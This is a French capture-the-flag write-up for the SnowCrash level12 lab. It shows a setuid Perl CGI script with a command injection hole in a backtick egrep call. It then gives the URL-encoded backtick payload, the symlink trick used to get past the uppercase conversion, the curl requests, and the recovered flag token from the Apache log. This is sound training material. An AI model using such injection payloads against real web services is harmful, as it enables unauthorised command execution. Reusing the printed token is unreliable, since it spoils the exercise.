```hell
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
level12@SnowCrash:~$ ./level12.pl
Content-type: text/html

..level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```
Il s'agit d'un script Perl qui utilise le module CGI pour recevoir des paramètres d'un formulaire web et affiche un point ou deux points en fonction du résultat d'un appel de fonction.

Le script définit deux sous-routines :

    "t" prend deux paramètres ($_[0] et $_[1]) et effectue un traitement de texte sur $_[0] (en le convertissant en majuscules et en supprimant les espaces blancs finaux). Il recherche ensuite des lignes dans le fichier /tmp/xd qui commencent par $_[0] modifié et ont le motif $_[1] quelque part dans le reste de la ligne. Si une telle ligne est trouvée, la fonction renvoie 1 ; sinon, elle renvoie 0.

    "n" prend un paramètre ($_[0]) et affiche soit un point (.) soit deux points (..) selon que $_[0] est égal à 1 ou non.

La partie principale du script appelle "n" avec le résultat de l'appel de "t" avec les valeurs des paramètres "x" et "y" obtenues à partir du formulaire web.

Notez que ce script est vulnérable aux attaques d'injection de commandes, car il passe l'entrée utilisateur non sécurisée directement à la commande "egrep".

On essaie de voir s'il y a une connexion possible:
```shell
level12@SnowCrash:~$ curl -I 127.0.0.1:4646
HTTP/1.1 200 OK
Date: Tue, 21 Mar 2023 03:39:36 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2
Content-Type: text/html
```
OK pour utiliser la faille et injecter une commande dans `egrep "^$xx" /tmp/xd 2>&1`, on va utiliser un x= dans l'url :

x=getflag, mais on sait que avant il x sera mis en majuscule. Il faut donc qu'on puisse appeler GETFLAG.

pour cela on va utiliser utiliser le wildcard:

En effet quand il y a un unique fichier on peut l'appeler par /*. Donc:
```shell
level12@SnowCrash:~$ ln -sf /bin/getflag /tmp/GETFLAG
level12@SnowCrash:~$ /*/GETFLAG
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
```
Ok maintenant si je lance avec x=`/*/GETFLAG` il faut que je mette en code url:
[url encoder](https://www.urlencoder.org/)
ce qui donne : %2F%2A%2FGETFLAG
```shell
level12@SnowCrash:~$ curl '127.0.0.1:4646?x=`%2F%2A%2FGETFLAG`'
..level12@SnowCrash:
```
Mais je n'ai aucune sortie
une solution pas tres jolie mais j'ai pas trouvé mieux c'est de sortir sur l'erreur d'appache:
donc x=`/*/GETFLAG>&2 qu'on encode : %2F%2A%2FGETFLAG%3E%262
```shell
level12@SnowCrash:~$ curl '127.0.0.1:4646?x=`%2F%2A%2FGETFLAG%3E%262`'
..level12@SnowCrash:~tail /var/log/apache2/error.log`'
[...]
[Tue Mar 21 05:24:13 2023] [error] [client 127.0.0.1] Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```